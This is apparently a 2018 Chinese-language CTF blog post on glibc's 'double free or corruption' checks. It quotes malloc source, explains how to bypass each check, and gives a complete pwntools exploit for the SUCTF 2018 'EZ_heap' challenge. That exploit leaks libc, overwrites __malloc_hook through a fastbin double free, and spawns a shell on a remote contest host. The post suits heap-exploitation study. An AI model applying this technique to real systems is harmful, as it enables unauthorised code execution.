---
title: double free or corrupttion
date: 2018-11-14 17:12:30
tags: pwn basic
---
DOUBLE FREE OR CORRUPTION！

<!--more-->
# Souce
[源码][1]是一切问题的基础。
# Double free
这次主要从源码层面看看double free的各个报错成因，以及绕过姿势。

# Fastbin 
## fasttop
int_free===>if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())
也就是free到fastbin对于doublefree的检测....非常友好
```python
 if (SINGLE_THREAD_P)
      {
        /* Check that the top of the bin is not the record we are going to
           add (i.e., double free).  */
        if (__builtin_expect (old == p, 0))
          malloc_printerr ("double free or corruption (fasttop)");
        p->fd = old;
        *fb = p;
      }
    else
      do
        {
          /* Check that the top of the bin is not the record we are going to
             add (i.e., double free).  */
          if (__builtin_expect (old == p, 0))
            malloc_printerr ("double free or corruption (fasttop)");
          p->fd = old2 = old;
        }
      while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))
             != old2);
```
这货比较无脑主要是check上个free过得chunk和现在的是不是一样....
所以绕过方式也比较简单
```python
free(1)
free(2)
free(1)
```
如果fastbin中可以freefree过的chunk，那么可以在fastbin中为所欲为...
## EZ_heap
su_2018_招新赛的一题[附件][2]
直接通过doublefree做fastbin_atk改写__malloc_hook然后doublefree触发printerr就可以了
```python
from pwn import *
def cmd(c):
	p.sendlineafter("choice : ",str(c))
def add(size,name,kind="A"):
	cmd(1)
	p.sendlineafter("name :",str(size))
	p.sendafter("animal :",name)
	p.sendlineafter("animal :",kind)
def show():
	cmd(2)
def free(idx):
	cmd(3)
	p.sendlineafter("cage:",str(idx))
def clear_all():
	cmd(4)
p=process("./pwn")
p=remote("43.254.3.203",10006)
#context.log_level='debug'
add(0x1000000090,"A\n")#0
add(0x18,"\n")#1
free(0)
add(0x18,"\n")#2
show()
p.readuntil("[2] :\n")
base=(u64((p.readline()[:-1]+"\x00").ljust(8,'\x00'))<<8)-(0x7fa2234a1b00-0x00007fa2230dd000)
log.warning(hex(base))
#gdb.attach(p)
add(0x60,"\n")#3
add(0x60,'\n')#4

free(3)
free(4)
free(3)
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address=base
add(0x60,p64(libc.symbols['__malloc_hook']-35))#3
add(0x60,"\n")#4
add(0x60,"\n")#5
one=0xf02a4+base
add(0x60,'\x00'*19+p64(one))
free(4)
free(4)
#gdb.attach(p)
p.interactive()

#x/8gx 0x0000000006020E0
```
# Not fastbin Not mmapped
主要有以下三个检测
```c
/* Lightweight tests: check whether the block is already the
       top block.  */
    if (__glibc_unlikely (p == av->top))
      malloc_printerr ("double free or corruption (top)");
    /* Or whether the next chunk is beyond the boundaries of the arena.  */
    if (__builtin_expect (contiguous (av)
                          && (char *) nextchunk
                          >= ((char *) av->top + chunksize(av->top)), 0))
        malloc_printerr ("double free or corruption (out)");
    /* Or whether the block is actually not marked used.  */
    if (__glibc_unlikely (!prev_inuse(nextchunk)))
      malloc_printerr ("double free or corruption (!prev)");
```
第一个检测是否是topchunk...一般利用的时候没啥问题
第二个检测本个chunk的末尾是否超出topchunk+topchunk_size...一般注意点改size没啥大问题
第三个检测应该是最常见的，检查下一个chunk的pre_preinuse位，解决方法也就是改pre_preinuse...
看完了doublefree...的几个报错感觉没啥好说的...都比较基础....
就当整合一下知识把...
## over
感觉double free 算是uaf中最友好的利用起来也非常人性化....
本来以为工作量挺大的....没想到20min就写完了....可能太菜了没发觉真正值得研究的东西...


[1]:https://code.woboq.org/userspace/glibc/malloc/malloc.c.html
[2]:https://github.com/n132/Watermalon/tree/master/SUCTF_2018